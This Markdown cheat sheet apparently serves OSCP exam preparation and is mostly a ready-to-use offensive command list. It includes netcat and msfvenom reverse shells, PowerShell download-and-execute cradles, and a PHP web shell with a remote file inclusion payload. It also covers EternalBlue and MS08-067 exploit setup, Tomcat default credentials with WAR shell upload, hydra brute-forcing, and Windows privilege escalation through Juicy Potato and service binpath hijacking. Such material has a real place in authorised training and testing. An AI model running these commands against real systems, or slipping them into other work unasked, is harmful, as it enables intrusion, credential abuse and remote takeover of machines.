# OSCP-Cheat-Sheet

1. [Common Commands](#common-commands)
 
    - [Downloading Files (Curl / Wget)](#downloading-files-curl--wget)

    - [Download Files with PowerShell](#upload--download-files-with-netcat)

    - [Upload / Download Files with Netcat](#download-files-with-powershell)

    - [Netcat](#netcat)

    - [Reverse Shells](#reverse-shells)

    - [Upgrading Reverse Shells](#upgrading-reverse-shells)

2. [NMAP](#nmap)

    - [Common Switches](#common-switches)

    - [TCP Scan](#tcp-scan)

    - [UDP Scan](#udp-scan)

3. [DNS](#dns)

    - [Zone Transfer](#zone-transfer)

4. [SMB/Samba](#smbsamba)

5. [SNMP](#snmp)

    - [MIB Values](#mib-values)

6. [Web Servers](#web-servers)

    - [Wordlists](#wordlists)

    - [Bruteforcing POST Requests](#bruteforcing-post-requests)

    - [Tomcat](#tomcat)

        - [Default Credentials](#default-credentials)

        - [Uploading to Tomcat6](#uploading-to-tomcat6)

        - [Uploading to Tomcat7 and Above](#uploading-to-tomcat7-and-above)
    
    - [Local File Inclusion / Remote File Inclusion](#local-file-inclusion--remote-file-inclusion-lfi--rfi)

7. [FTP](#ftp)

    - [Bruteforce](#bruteforce)

    - [Download](#download)

    - [Upload](#upload)

8. [Kerberos](#kerberos)

9. [SMB Exploitation](#smb-exploitation)

    - [Eternal Blue (MS17-010)](#eternal-blue-ms17-010)

        - [Payload](#payload)

    - [MS08-067](#ms08-067)

        - [Payloads](#payloads)

10. [Linux Privilege Escalation](#linux-privilege-escalation)

    - [Enumeration Scripts](#enumeration-scripts)

    - [SUID Binaries](#suid-binaries)

11. [Windows Privilege Escalations](#windows-privilege-escalation)

    - [Enumeration Scripts](#enumeration-scripts-1)

    - [Juicy Potato](#juicy-potato)

        - [Vulnerable OS Versions](#vulnerable-os-versions)

        - [Generating the Payload](#generating-the-payload)

        - [Execution](#execution)

    - [Service Exploitation](#service-exploitation)

        - [Windows XP SP0/SP1](#windows-xp-sp0sp1)

12. [MSFvenom Payloads](#msfvenom-payloads)

    - [Linux](#linux)

    - [Windows](#windows)

    - [PHP](#php)

    - [JSP](#jsp)

    - [WAR](#war)

    - [ASP Payload](#asp-payload)

    - [ASP.NET Payload](#aspnet-payload)

    - [Python](#python)

    - [Bash](#bash)

    - [Perl](#perl)

13. [References](#references)

## Common Commands

Python HTTP Server: <code>python -m SimpleHTTPServer [PORT]</code>

Python FTP Server: <code>python -m pyftpdlib -p 21</code>

Linux Listener: <code>nc -lnvp [PORT]</code>

Windows Listener: <code>nc.exe -lnvcp [PORT]</code>

Searching for Exploits/Vulnerabilities: <code>searchsploit [APPLICATION]</code>

Downloading Exploits From searchsploit <code>searchsploit -x [EXPLOIT_CODE] > [EXPLOIT.EXTENSION]</code>

### Downloading / Uploading Files (Curl / Wget)

<code>curl [URL] -o [FILENAME]</code>

<code>curl -X PUT http://[IP]/[FILE] -d @[FILE]  -v</code>

<code>wget [URL]</code>

### Download Files with PowerShell

<code>powershell Invoke-RestMethod -Uri '[URL]' -OutFile '[PATH\TO\FILE\]'</code>

<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')</code>

### Upload / Download Files with Netcat

Download: <code>nc -lnvp [PORT] > [OUT_FILE]</code>

Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>

### Netcat

Linux: <code>nc -nv [IP] [PORT] -e /bin/bash</code>

Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>

### Reverse Shells

[PayloadsAllTheThings Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[PentestMonkey Reverse Shells](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Upgrading Reverse Shells

Follow steps found [here](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)

<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>

<code>export TERM=screen</code>

Background the shell with <code>Ctrl+Z</code>

<code>stty raw -echo</code>

Foreground the shell with <code>fg</code> 

Hit Return 2x

## NMAP

### Common Switches

<code>-A</code>: OS Fingerprinting

<code>-O</code>: OS Detection

<code>-sV</code>: Service Version/Enumeration

<code>-sC</code>: Enables Safe Scripts

<code>-Pn</code>: Avoids Ping Scans

<code>-sS</code>: Stealth Scan / SYN Scan

<code>-sU</code>: UDP Scan

<code>-v/-vv/-vvv</code>: Varying Levels of Verbosity

<code>-T[1-5]</code>: Speed of Scan (5 Being the Fastest)

<code>-p [PORT(S)]</code>: Specify Port, or Porvide Comma Seperated List of Ports

<code>-p-</code>: Full Port Scan

### TCP Scan

<code>nmap -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.tcp] -p- [IP]</code>

### UDP Scan

<code>nmap -sU -v -sS -sC -sV -T4 -Pn -oA nmap/[filename.udp] [IP]</code>

## DNS

<code>dnsenum [DOMAIN]</code>

<code>dnsrecon -d [DOMAIN]</code>

### Zone Transfer

<code>dnsrecon -d [DOMAIN] -a</code>

## SMB/Samba

<code>nmap -p 139,445 -Pn -script=smb-vuln* [IP]</code>

<code>smbclient -L //[IP]/</code>

<code>enum4linux -a [IP]</code>

<code>smbmap -H [IP]</code>

<code>./smbver.sh [IP]</code> [Found Here](https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh)

Logging into SMB Share

<code>smbclient //[IP]/[SHARE]</code>

Downloading all files from a directory

<code>smbclient //[IP]/[SHARE] -U [USER] -c "prompt OFF;recurse ON;mget *"</code>

## SNMP

<code>snmpwalk -c [COMMNITY_STRING] -v[SNMP_VERSION] [IP]</code>

<code>onesixtyone -c [COMMNITY_STRING] -i [IPS]</code>

<code>snmp-check [IP]</code>

### MIB Values

System Processes: <code>1.3.6.1.2.1.25.1.6.0</code>

Running Programs: <code>1.3.6.1.2.1.25.4.2.1.2</code>

Processes Path: <code>1.3.6.1.2.1.25.4.2.1.4</code> 

Storage Units: <code>1.3.6.1.2.1.25.2.3.1.4</code>

Software Name: <code>1.3.6.1.2.1.25.6.3.1.2</code>

User Accounts: <code>1.3.6.1.4.1.77.1.2.25</code>

TCP Local Ports: <code>1.3.6.1.2.1.6.13.1.3</code>

<code>snmpwalk -c [COMMNITY_STRING] -v[SNMP_VERSION] [IP] [MIB_VALUE]</code> 

## Werb Servers

<code>dirb [URL]</code>

<code>nikto -h [URL]</code>

### Wordlists

<code>cewl [URL]</code>

### Bruteforcing POST requests

<code>hydra -l/-L [USERNAME/USER_LIST] -P [PASSWORDLIST] [IP] http-form-post "[ENDPOINT]:[POST_PARAMETERS]&User=^USER^&Password=^PASS^:[FAILED_LOGIN_ERROR]."</code>

### Tomcat

#### Default Credentials

<code>admin:admin</code>

<code>tomcat:tomcat</code>

<code>admin:[NOTHING]</code>

<code>admin:s3cr3t</code>

<code>tomcat:s3cr3t</code>

<code>admin:tomcat</code>

#### Uploading to Tomcat6

<code>wget 'http://[USER]:[password]@[IP]:8080/manager/deploy?war=file:shell.war&path=/shell' -O -</code>

#### Uploading to Tomcat7 and Above

<code>curl -v -u [USER]:[PASSWORD] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>

### Local File Inclusion / Remote File Inclusion (LFI / RFI)

[LFI / RFI Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

#### LFI

<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=../../../../[PATH/TO/LOCAL/FILE]</code>

Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>

Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>

Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>

#### RFI

<code><?php echo shell_exec($_GET['cmd']); ?\></code>

Store in a file on local host, navigate to it via the web app and pass commands to it.

<code>http://[VULN_IP]/[VULN_PAGE]?[VULN_PARAMETER]=http://[LOCAL_IP]/rfi.txt&cmd=[COMMAND]</code>

## FTP 

### Bruteforce

<code>hydra -V -f -L [USER_LIST] -P [PASSWORDS_LIST] ftp://[IP] -u -vV</code>

### Download

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>get [FILE]</code>

### Upload

<code>ftp [IP]</code>

<code>>PASSIVE</code>

<code>>BINARY</code>

<code>>put [FILE]</code>

## Kerberos

<code>https://www.tarlogic.com/en/blog/how-to-attack-kerberos/</code>

## SMB Exploitation

### Eternal Blue (MS17-010) 

Use exploit found [here](https://github.com/worawit/MS17-010)

#### Payload

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe -o shell.exe</code>

Change the <code>USERNAME = ''</code> line to <code>USERNAME = '//'</code>

Uncomment the <code>smb_send_file(...)</code> and the <code>service_exe(...)</code>

Modify them to upload and execute the payload file

Use listener 

<code>nc -lnvp [PORT]</code>

### MS08-067

Use exploit found [here](https://github.com/andyacer/ms08_067)

## PowerShell Privilege Escalation

Both [Nishang](https://github.com/samratashok/nishang) and [Empire](https://github.com/EmpireProject/Empire) have a suite of PowerShell tools.

### MS16-032

Use the Empire [Invoke-MS16-032.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)

Use Nishang's [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) for reverse shell payload.

Add the following line to the bottom of the Invoke-PowerShellTcp.ps1 script:

<code>Invoke-PowerShellTcp -Reverse -IPAddress [LOCAL_IP] -Port [PORT]</code>

Add the following to the bottom of the Invoke-MS16-032 script:

<code>Invoke-MS16-032 -Command "IEX(New-Object Net.WebClient).DownloadString('[URL]/[REVERSEHLL_PAYLOAD')"</code>

Execute on the host by running the following:

<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]/Invoke-MS16-032.ps1')</code>

#### Payloads

Windows x86: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows -o shell.c</code>

Windows x64: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x64 --platform windows -o shell.c</code>

Replace shell code in the script 

Execute the script

<code>python ms08_067_2018.py [IP] [OS_OPTION] [PORT]</code>

Use listener 

<code>nc -lnvp [PORT]</code>

## Linux Privilege Escalation

### Enumeration Scripts

<code>LinPEAS.sh</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

<code>LinEnum.sh</code> Found [here](https://github.com/rebootuser/LinEnum)

### SUID Binaries

- [GTFOBins](https://gtfobins.github.io/)

- [Priv Esc with SUIDs](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)

## Windows Privilege Escalation

### Enumeration Scripts

<code>SharUp.exe</code> Found [here](https://github.com/GhostPack/SharpUp)

<code>Sherlock.ps1</code> Found [here](https://github.com/rasta-mouse/Sherlock)

<code>WinPEAS.exe</code> Found [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

### Juicy Potato

Found [here](https://github.com/ohpe/juicy-potato) ([pre-compile binaries](https://github.com/ohpe/juicy-potato/releases))

#### Vulnerable OS Versions

- Windows 7 Enterprise
- Windows 8.1 Enterprise
- Windows 10 Enterprise
- Windows 10 Professional
- Windows Server 2008 R2 Enterprise
- Windows Server 2012 Datacenter
- Windows Server 2016 Standard

#### Required Permissions
- <code>SeImpersonate</code>
- <code>SeAssignPrimaryToken</code>

#### Generating the payload

Windows x64: <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>

Windows x82: <code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL-IP] LPORT=[PORT] -f exe -o shell.exe</code>

#### Execution

Create the listener to cath the payload

<code>nc -lnvp [PORT]</code>

Run the exploit on the target host.

<code>JuicyPotato.exe -l 1337 -p [DIR\TO\PAYLOAD] -t * -c {CLSID}</code>

### Service Exploitation

#### Windows XP SP0/SP1

Upload <code>accesschk.exe</code> and <code>nc.exe</code> to the target host.

<code>accesschk.exe /accepteula -uwcqv "Autenticated Users" *</code>

Running the following gives more information about the specified service (i.e. what groups have what permissions over it).

<code>accesschk.exe /accepteula -ucqv [SERVICE]</code>

To see the start type, dependencies, and binary path the service uses:

<code>sc qc [SERVICE]</code>

Check the status of the service.

<code>sc query [SERVICE]</code>

If needed, change the start type of the service 

<code>sc config [SERVICE] start= auto</code>

Changing the binary path:

<code>sc config [SERVICE] binpath= [PATH\TO\nc.exe [KALI IP] [PORT] -e C:\WINDOWS\System32\cmd.exe]</code>

Setup the netcat listener and start the service.

Starting / Stopping the Service

<code>net start [SERVICE]</code>

<code>net stop [SERVICE]</code>

## MSFvenom Payloads

### Linux

<code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f elf > shell.elf</code>

### Windows

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>

<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>

<code>msfvenom -p windows/x82/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>

### PHP

<code>msfvenom -p php/reverse_php LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.php</code>

Append <code><?php</code>

### JSP

<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.jsp</code>

### WAR

<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f war > shell.war</code>

### ASP Paylod: 

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>

### ASP.NET Payload: 

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>

<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>

### Python

<code>msfvenom -p cmd/unix/reverse_python LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.py</code>

### Bash

<code>msfvenom -p cmd/unix/reverse_bash LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.sh</code>

### Perl

<code>msfvenom -p cmd/unix/reverse_perl LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.pl</code>

## References

[Liodeus Cheat Sheet](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html)

[Ultimate Cheat Sheet](https://www.bytefellow.com/oscp-ultimate-cheatsheet/)

[akenofu Cheat Sheet](https://github.com/akenofu/OSCP-Cheat-Sheet)
